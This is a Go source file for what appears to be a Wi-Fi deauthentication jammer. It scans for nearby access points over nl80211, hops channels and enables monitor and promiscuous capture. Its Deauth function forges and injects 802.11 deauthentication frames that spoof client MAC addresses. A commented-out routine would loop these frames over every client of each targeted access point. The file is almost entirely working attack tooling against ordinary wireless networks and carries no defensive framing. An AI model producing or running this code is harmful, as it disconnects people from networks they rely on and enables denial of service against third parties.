package main

import (
	"errors"
	"fmt"
	"log"
	"net"
	"syscall"
	"time"

	"github.com/dauie/go-netlink/nl80211"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/mdlayher/genetlink"
	"github.com/mdlayher/netlink"
)

type JamConn		struct {
	chanInx			int
	lastChanSwitch	time.Time
	lastDeauth		time.Time
	nlconn			*genetlink.Conn
	ifa				*net.Interface
	fam				*genetlink.Family
	handle			*pcap.Handle
}

func  (conn *JamConn)SetLastDeauth(lastDeauth time.Time) {

	conn.lastDeauth = lastDeauth
}

func (conn *JamConn) SetLastChanSwitch(lastChanSwitch time.Time) {

	conn.lastChanSwitch = lastChanSwitch
}

func _NewJamConn(nlconn *genetlink.Conn, ifa *net.Interface, fam *genetlink.Family) *JamConn {

	return &JamConn{chanInx: 1, nlconn: nlconn, ifa: ifa, fam: fam}
}

func NewJamConn(ifaName string) (*JamConn, error) {

	nlconn, err := genetlink.Dial(nil)
	if err != nil {
		return nil, errors.New("genetlink.Dial() " + err.Error())
	}
	ifa, err := getInterface(ifaName)
	if err != nil {
		log.Fatalln(err)
	}
	fam, err := getNL80211Family(nlconn)
	if err != nil {
		return nil, errors.New("getNL80211Family() " + err.Error())
	}
	return _NewJamConn(nlconn, &ifa, fam), nil
}

func (conn *JamConn) SetDeviceChannel(c int) error {

	if c < 1 || c > 14 {
		return errors.New("invalid channel")
	}
	chann := ChansG[c - 1]
	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	encoder.Uint32(nl80211.ATTR_WIPHY_FREQ, chann.CenterFreq)
	encoder.Uint32(ATTR_CHANNEL_WIDTH, chann.ChanWidth)
	encoder.Uint32(ATTR_CENTER_FREQ, chann.CenterFreq)
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_SET_CHANNEL,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func (conn *JamConn) SendScanAbort() error {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_ABORT_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		if err != syscall.ENOENT {
			return errors.New("genetlink.Conn.Execute() " + err.Error())
		} else {
			log.Println("no active scan")
		}
	} else {
		fmt.Println("scan aborted")
	}
	return nil
}

func (conn *JamConn) GetScanResults() ([]Ap, error) {

	encoder := netlink.NewAttributeEncoder()
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsDump
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return nil, errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_GET_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	msgs, err := conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return nil, errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return decodeScanResults(msgs)
}

func (conn *JamConn) SetFilterForTargets() error {

	var bpfExpr string
	//var i = 0
	//var ln = len(targetList) - 1

	//for _, v := range targetList {
	//	bpfExpr = bpfExpr + fmt.Sprintf("ether host %s", v.hwaddr.String())
	//	if i < ln {
	//		i++
	//		bpfExpr = bpfExpr + " or "
	//	}
	//}
	bpfExpr = fmt.Sprintf("not ether host %s and not ether host %s", conn.ifa.HardwareAddr.String(), BroadcastAddr)
	if err := conn.handle.SetBPFFilter(bpfExpr); err != nil {
		return errors.New("pcap.Handle.SetPBFFilter() " + err.Error())
	}
	return nil
}

func (conn *JamConn) SetupPcapHandle() error {

	inactive, err := pcap.NewInactiveHandle(conn.ifa.Name)
	defer inactive.CleanUp()
	if err != nil {
		log.Fatalln("pcap.NewInactiveHandle() ", err)
	}
	if err := inactive.SetBufferSize(DefPcapBufLen); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetSnapLen(512); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetTimeout(time.Second * 1); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetRFMon(true); err != nil {
		log.Fatalln(err)
	}
	if err := inactive.SetPromisc(true); err != nil {
		log.Fatalln(err)
	}
	conn.handle, err = inactive.Activate()
	if err != nil {
		return errors.New("pcap.InactiveHandle.Activate()" + err.Error())
	}
	return nil
}

/* Playing around with making and removing virtual interfaces */
func (conn *JamConn) MakeMonIfa() error {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFTYPE, nl80211.IFTYPE_MONITOR)
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	encoder.String(nl80211.ATTR_IFNAME, "mon42")
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_NEW_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func (conn *JamConn) DelMonIfa() error {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_DEL_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func (conn *JamConn) SetIfaType(ifaType uint32) error {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFTYPE, ifaType)
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	attribs, err := encoder.Encode()
	if err != nil {
		return errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_SET_INTERFACE,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsAcknowledge
	_, err = conn.nlconn.Execute(req, conn.fam.ID, flags)
	if err != nil {
		return errors.New("genetlink.Conn.Execute() " + err.Error())
	}
	return nil
}

func (conn *JamConn) DoAPScan(whiteList *List) (macWatch List, err error) {

	scanMCID, err := getNL80211ScanMCID(conn.fam)
	if err := conn.nlconn.JoinGroup(scanMCID); err != nil {
		return List{}, errors.New("genetlink.Conn.JoinGroup() " + err.Error())
	}
	if ok, err := conn.TriggerScan(); !ok {
		if err.Error() == "scan failed" {
			//retry scan once
			if ok, err := conn.TriggerScan(); !ok {
				return List{}, errors.New("JamConn.TriggerScan() " + err.Error())
			}
		}
		return List{}, errors.New("JamConn.TriggerScan() " + err.Error())
	}
	stations, err := conn.GetScanResults()
	if err != nil {
		return List{}, errors.New("JamConn.GetScanResults() " + err.Error())
	}
	if err := conn.nlconn.LeaveGroup(scanMCID); err != nil {
		return List{}, errors.New("genetlink.LeaveGroup() " + err.Error())
	}
	return makeApWatchList(stations, whiteList), nil
}

func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
	if time.Since(conn.lastChanSwitch) > timeout {
		if conn.chanInx + 1 < len(ChansG) - 1 {
			conn.chanInx += 1
		} else {
			conn.chanInx = 1
		}
		//TODO refactor
		_ = conn.SetDeviceChannel(conn.chanInx + 1)
		conn.lastChanSwitch = time.Now()
	}
}

//func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) error {
//
//	if time.Since(conn.lastDeauth) > timeout {
//		for _, v := range apList.contents {
//			ap := v.(Ap)
//			for _, cli := range ap.Clients {
//				if err := conn.Deauth(&cli, &ap); err != nil {
//					return errors.New("JamConn.Deauth() " + err.Error())
//				}
//			}
//		}
//		conn.lastDeauth = time.Now()
//	}
//	return nil
//}

func (conn *JamConn) Deauth(client net.HardwareAddr, ap net.HardwareAddr, tap *layers.RadioTap, dot11Orig *layers.Dot11) error {

	var buff gopacket.SerializeBuffer
	var opts gopacket.SerializeOptions

	buff = gopacket.NewSerializeBuffer()
	opts.ComputeChecksums = true
	opts.FixLengths = true
	dot11 := layers.Dot11{
		Type: layers.Dot11TypeMgmtDeauthentication,
		Proto: 0,
		Flags: layers.Dot11Flags(0),
		DurationID: dot11Orig.DurationID,
		//dst
		Address1: ap,
		//src
		Address2: client,
		//bssid
		Address3: ap,
		//
		Address4: client,
		SequenceNumber: dot11Orig.SequenceNumber + 1,
		FragmentNumber: 0,
	}
	mgmt := layers.Dot11MgmtDeauthentication {
		Reason: layers.Dot11ReasonDeauthStLeaving,
	}
	if err := gopacket.SerializeLayers(buff, opts,
		tap,
		&dot11,
		&mgmt,
	); err != nil {
		return errors.New("gopacket.SerializeLayers() " + err.Error())
	}
	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
		return errors.New("Handle.WritePacketData() " + err.Error())
	}
	fmt.Printf("deauthing client %s - from %s\n", client.String(), ap.String())
	return nil
}

func (conn* JamConn) TriggerScan() (bool, error) {

	encoder := netlink.NewAttributeEncoder()
	encoder.Uint32(nl80211.ATTR_IFINDEX, uint32(conn.ifa.Index))
	// wildcard scan
	encoder.Bytes(nl80211.ATTR_SCAN_SSIDS, []byte(""))
	attribs, err := encoder.Encode()
	if err != nil {
		return false, errors.New("genetlink.Encoder.Encode() " + err.Error())
	}
	req := genetlink.Message {
		Header: genetlink.Header {
			Command: nl80211.CMD_TRIGGER_SCAN,
			Version: conn.fam.Version,
		},
		Data: attribs,
	}
	flags := netlink.HeaderFlagsRequest
	_, err = conn.nlconn.Send(req, conn.fam.ID, flags)
	if err != nil {
		return false, errors.New("genetlink.Conn.Send() " + err.Error())
	}
	done := false
	for !done {
		msgs, _, err := conn.nlconn.Receive()
		if err != nil {
			return false, errors.New("genetlink.Conn.Recieve() " + err.Error())
		}
		for _, m := range msgs {
			switch m.Header.Command {
			case nl80211.CMD_NEW_SCAN_RESULTS:
				done = true
				break
			case nl80211.CMD_SCAN_ABORTED:
				return false, errors.New("scan failed")
			default:
				break
			}
		}
	}
	return true, nil
}
